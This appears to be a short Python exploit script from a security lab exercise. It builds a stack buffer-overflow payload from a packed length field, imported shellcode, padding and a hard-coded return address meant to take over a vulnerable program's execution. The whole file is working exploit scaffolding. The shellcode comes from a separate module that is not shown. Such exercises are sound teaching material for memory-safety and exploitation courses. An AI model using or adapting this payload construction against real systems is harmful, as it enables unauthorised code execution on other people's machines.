from shellcode import shellcode
from struct import pack

print(pack("<I", 0x40000008) + shellcode + "0" * 53 + pack("<I", 0xbffe9920))
